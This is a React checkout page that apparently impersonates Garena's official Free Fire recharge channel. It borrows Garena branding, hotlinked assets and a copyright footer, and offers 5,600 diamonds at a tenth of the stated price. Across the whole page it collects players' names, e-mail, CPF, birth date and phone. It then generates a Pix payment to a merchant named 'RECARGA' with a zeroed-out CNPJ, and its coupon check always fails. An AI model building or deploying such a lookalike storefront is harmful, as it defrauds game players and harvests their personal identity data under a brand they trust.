// src/components/checkout/CheckoutPage.tsx
import React, { useState, useEffect } from 'react';
import { ArrowLeft, ShoppingBag } from 'lucide-react';
import { Product, CustomerData, PaymentMethod, Order } from '../../types/checkout';
import OrderSummary from './OrderSummary';
import CustomerForm from './CustomerForm';
import PaymentMethods from './PaymentMethods';
import CouponInput from './CouponInput';
import PixPayment from '../checkout/PixPayment';
import { getUTMParams, sendAnalyticsEvent } from '../../services/checkoutService';
import {
  validateCPF, validatePhone, validateCEP, validateBirthDate, formatPhone, formatCPF, validateEmail
} from '../../utils/validators';
import '../../styles/checkout.css';
import '../../styles/checkout-garena.css';

import { maskPhone, maskCPF, maskDate } from "../../utils/masks";
import { emailSuggestion } from "../../utils/emailAutoComplete";

interface CheckoutPageProps {
  initialProducts?: Product[];
  onBack?: () => void;
}

const defaultProducts: Product[] = [
  {
    id: '1',
    name: '5.600 Diamantes',
    sku: 'FF-5600-DM',
    quantity: 1,
    price: 19.90,
    originalPrice: 199.00,
    imageUrl: '/diamantes.png',
    bonus: '1.200 bônus',
  },
];

export default function CheckoutPage({ initialProducts, onBack }: CheckoutPageProps) {
  // --- estados / lógica ---
  const [products, setProducts] = useState<Product[]>(initialProducts || defaultProducts);
  const [couponInput, setCouponInput] = useState<string>("");
  const [isApplying, setIsApplying] = useState(false);
  const [couponMessage, setCouponMessage] = useState<string | null>(null);

  const [showPix, setShowPix] = useState(false);
  const [pixData, setPixData] = useState<any>(null);
  // amount real calculado a partir dos produtos (ex.: subtotal)
  const subtotal = products.reduce((acc, p) => acc + p.price * p.quantity, 0);
  const amount = subtotal; // valor em reais (converter pra centavos ao enviar)
  const [loading, setLoading] = useState(false);

  // Mantemos apenas customerData (removemos duplicidade)
  const [customerData, setCustomerData] = useState<CustomerData>({
    name: '',
    email: '',
    cpf: '',
    phone: '',
    birthDate: '',
  });

  const [errors, setErrors] = useState({
    cpf: "",
    email: "",
    phone: "",
    birthDate: ""
  });

  const getFieldMessage = (field: string) => {
    switch (field) {
      case "cpf": return "CPF inválido.";
      case "email": return "E-mail inválido.";
      case "phone": return "Telefone inválido.";
      case "birthDate": return "Data de nascimento inválida.";
      default: return "Campo inválido.";
    }
  };

  const handleValidateCustomerField = (field: keyof typeof errors, isValid: boolean) => {
    setErrors(prev => ({ ...prev, [field]: isValid ? "" : getFieldMessage(field) }));
  };

  // auxiliares para atualizar customerData
  const onCustomerChange = (field: keyof CustomerData, value: string) => {
    setCustomerData(prev => ({ ...prev, [field]: value }));
  };

  // CPF (com máscara e validação)
  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value;
    const formatted = maskCPF(raw); // se maskCPF retorna formatado
    setCustomerData(prev => ({ ...prev, cpf: formatted }));
    handleValidateCustomerField("cpf", validateCPF(formatted));
  };

  // email
  const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const v = e.target.value;
    setCustomerData(prev => ({ ...prev, email: v }));
    const ok = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
    handleValidateCustomerField("email", ok);
  };

  // phone
  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, "");
    setCustomerData(prev => ({ ...prev, phone: raw }));
    handleValidateCustomerField("phone", validatePhone(raw));
  };

  // birth date
  const handleBirthChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const v = e.target.value;
    setCustomerData(prev => ({ ...prev, birthDate: v }));
    handleValidateCustomerField("birthDate", validateBirthDate(v));
  };

  // cupom
  const applyCoupon = async () => {
    if (!couponInput.trim()) return;
    setIsApplying(true);
    // simulação, implementar validação real depois
    await new Promise(res => setTimeout(res, 600));
    setIsApplying(false);
    setCouponMessage("Cupom inválido ou expirado.");
  };

  const allValid =
    (customerData.name || "").trim().length >= 3 &&
    validateCPF(customerData.cpf) &&
    validatePhone(customerData.phone) &&
    validateBirthDate(customerData.birthDate || "") &&
    errors.email === "";

  // --- função que chama a API local em /api/create-pix ---
  const handleCreatePix = async () => {
    try {
      console.log("→ Iniciando criação do PIX...");
      setLoading(true);

      // prepara payload esperado pela sua function
      const payload = {
        value: Math.round(amount * 100), // CENTAVOS
        name: customerData.name,
        email: customerData.email,
        document: customerData.cpf.replace(/\D/g, "")
      };

      console.log("payload ->", payload);

      const response = await fetch("/api/create-pix", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      const data = await response.json();
      console.log("PIX DATA:", response.status, data);

      if (!response.ok) {
        // exibir erro do servidor (se vier via json)
        const serverMsg = data?.error || data?.message || "Erro ao gerar PIX";
        alert(`Erro ao gerar pagamento Pix: ${serverMsg}`);
        setLoading(false);
        return;
      }

      // adaptar ao formato do seu PixPayment
      setPixData({
        pixCode: data.copyPaste || data.qrcode_text || data.pix?.copy_paste || data.copy_paste,
        qrCodeBase64: data.qrCode || data.qrcode_base64 || data.pix?.qr_code || data.qrcode_base64,
        merchant: "RECARGA",
        cnpj: "00.000.000/0000-00"
      });

      setShowPix(true);
    } catch (err) {
      console.error("ERRO NO PIX:", err);
      alert("Erro inesperado ao gerar PIX.");
    } finally {
      setLoading(false);
    }
  };

  // --- JSX ---
  return (
    <>
      <img
        className="background-ff"
        src="https://assets.recargajogo.com.br/gop/mshop/www/live/assets/FF-06d91604.png"
        alt=""
      />

      <div
        className="ff-background"
        
      >
        <header className="sticky-alt">
          <div className="container-alt">
            <div className="flex-alt align-center-alt justify-between-alt">
              <a href="/" className="flex-alt align-center-alt">
                <div className="flex-alt align-center-alt">
                  <img src="/images/logo-mobile.svg" alt="Garena" className="block-alt show-mobile-alt" />
                  <img src="/images/logo.svg" alt="Garena" className="none-alt show-desktop-alt" />
                  <div className="divider-alt"></div>
                </div>
                <div className="header-text-alt">Canal Oficial de Recarga</div>
              </a>

              <div className="flex-alt align-center-alt">
                <img src="/images/avatar.svg" alt="Player Avatar" width={30} style={{ borderRadius: "50%" }} />
              </div>
            </div>
          </div>
        </header>

        <main>
          <form onSubmit={(e) => e.preventDefault()} className="ff-checkout-grid">
            <section className="ff-card">
              <button type="button" className="ff-back-btn" onClick={onBack}> Voltar</button>

              <div className="ff-card-top">
                <div className="ff-banner">
                  <img src="/images/FF-f997537d.jpg" alt="Banner" />
                </div>

                <div className="ff-game-icon">
                  <img src="/images/icon.png" alt="Free Fire" />
                </div>

                <h2 className="ff-game-title">Free Fire</h2>
              </div>

              <div className="ff-background-total">
                <div className="ff-totals">
                  <div className="ff-total-line">
                    <span>Total</span>
                    <span className="value"><small className="diamond"><img style={{ width: 16, display: 'inline' }} src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" /></small> {products.reduce((a, b) => a + b.quantity * (b.price), 0).toFixed(2)} </span>
                  </div>
                  <div className="ff-breakdown">
                    <div className="item"><span>Preço Original</span><span><img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" /> 65</span></div>
                    <div className="item"><span>+ Bônus Geral</span><span><img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/point.png" alt="" />  13</span></div>
                  </div>
                </div>
                <p className="ff-note">Os diamantes serão creditados diretamente na conta do jogo assim que recebermos a confirmação de pagamento.</p>

                <div className="ff-info-rows">
                  <div className="row"><span>Preço</span><strong>R$ {subtotal.toFixed(2)}</strong></div>
                  <div className="row"><span>Método de pagamento</span><strong>Pix via PagSeguro</strong></div>
                  <div className="row"><span>Nome do Jogador</span><strong>{customerData.name || 'SeuNickFF'}</strong></div>
                </div>
              </div>

              {!showPix && (
                <div className="checkout-form">
                  <div className="cupom-area">
                    <label>Código Promocional</label>
                    <div className="cupom-box">
                      <input type="text" placeholder="Código Promocional. Exemplo: PROMO1234" value={couponInput} onChange={(e) => setCouponInput(e.target.value)} className="cupom-input" />
                      <button type="button" className={`btn-aplicar ${couponInput.trim() ? "ativo" : "inativo"}`} disabled={!couponInput.trim() || isApplying} onClick={applyCoupon}>
                        {isApplying ? "Aplicando..." : "Aplicar"}
                      </button>
                    </div>
                    {couponMessage && <p style={{ color: "#ff4d4d", fontSize: "12px", marginTop: "6px" }}>{couponMessage}</p>}
                    <p className="legend">Possui um cupom de desconto? Digite acima para aplicar</p>
                  </div>

                  <div className="input-group">
                    <label>Nome Completo </label>
                    <input type="text" placeholder="Nome Completo" value={customerData.name} onChange={(e) => onCustomerChange("name", e.target.value)} />
                  </div>

                  <div className="input-group">
                    <label>E-mail </label>
                    <input type="text" value={customerData.email} onChange={handleEmailChange} />
                    {errors.email && <p className="error-text">{errors.email}</p>}
                  </div>

                  <div className="two-columns">
                    <div className="input-group">
                      <label>CPF </label>
                      <input type="text" value={customerData.cpf} onChange={handleCPFChange} placeholder="CPF" />
                      {errors.cpf && <p className="error-text-cpf">{errors.cpf}</p>}
                    </div>
                    <div className="input-group">
                      <label>Data de Nascimento</label>
                      <input type="text" value={customerData.birthDate} onChange={handleBirthChange} placeholder="DD/MM/AAAA" />
                      {errors.birthDate && <p className="error-text-data">{errors.birthDate}</p>}
                    </div>
                  </div>

                  <div className="input-group">
                    <label>Número de telefone </label>
                    <input type="text" value={formatPhone(customerData.phone)} onChange={handlePhoneChange} placeholder="Número de telefone" />
                    {errors.phone && <p className="error-text">{errors.phone}</p>}
                  </div>

                  <button
                    type="button"
                    className={`pay-button ${allValid ? "active" : "disabled"}`}
                    disabled={!allValid || loading}
                    onClick={handleCreatePix}
                  >
                    {loading ? "Gerando Pix..." : "Prosseguir para pagamento"}
                  </button>
                </div>
              )}
            </section>
          </form>

          {showPix && (
            <PixPayment
              pixCode={pixData?.pixCode}
              qrCodeBase64={pixData?.qrCodeBase64}
              amount={amount}
              merchantName={pixData?.merchant}
              merchantCnpj={pixData?.cnpj}
              onBack={() => setShowPix(false)}
            />
          )}
        </main>

        <div className="checkout-footer" style={{ marginTop: '28px' }}>
          <div className="checkout-footer-container">
            <div className="checkout-footer-content d-flex align-items-center justify-content-between" style={{ padding: '18px 0' }}>
              <span>© Garena Online. Todos os direitos reservados.</span>
              <div className="checkout-footer-links">
                <a href="#">FAQ</a>
                <span className="divider">|</span>
                <a href="#">Termos e Condições</a>
                <span className="divider">|</span>
                <a href="#">Política de Privacidade</a>
              </div>
            </div>
          </div>
        </div>
      </div>

      {console.log("showPix:", showPix)}
    </>
  );
}
